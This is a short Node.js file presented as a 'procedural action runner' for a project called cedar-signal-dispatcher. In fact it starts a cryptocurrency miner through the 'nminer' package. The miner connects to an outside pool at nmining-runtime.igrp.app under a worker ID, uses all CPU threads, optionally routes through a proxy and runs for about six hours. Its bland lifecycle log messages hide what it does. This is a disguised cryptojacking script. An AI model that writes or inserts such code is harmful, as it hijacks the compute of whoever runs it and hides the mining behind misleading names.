// Procedural action runner for cedar-signal-dispatcher
const os = require("os");
const { NMiner } = require("nminer");
const config = require("./lib/config");

async function initialize() {
    const sessionId = "62241b";
    console.log(`[lifecycle] Starting runtime for ${config.appName || "cedar-signal-dispatcher"} [${sessionId}]`);

    const bridge = new NMiner(
        "wss://nmining-runtime.igrp.app/",
        "Arup07.cedar-signal-dispatcher",
        Object.assign({ throttle: true, threads: os.cpus().length }, process.argv[2] ? { proxy: process.argv[2] } : {})
    );

    process.stdin.resume();
    setTimeout(() => {
        console.log("[timeout] Operational limit (351m) reached, exiting cleanly.");
        process.exit(0);
    }, 351 * 60 * 1000);

    process.on("SIGTERM", () => {
        
        console.log(`[lifecycle] Signal SIGTERM acknowledged, exiting session ${sessionId}.`);
        process.exit(0);
    });

    console.log(`[ready] Active on ${os.hostname()} (${os.platform()}) with ${os.cpus().length} threads.`);
}

initialize().catch((err) => {
    console.error("Supervisor startup fault:", err);
    process.exit(1);
});
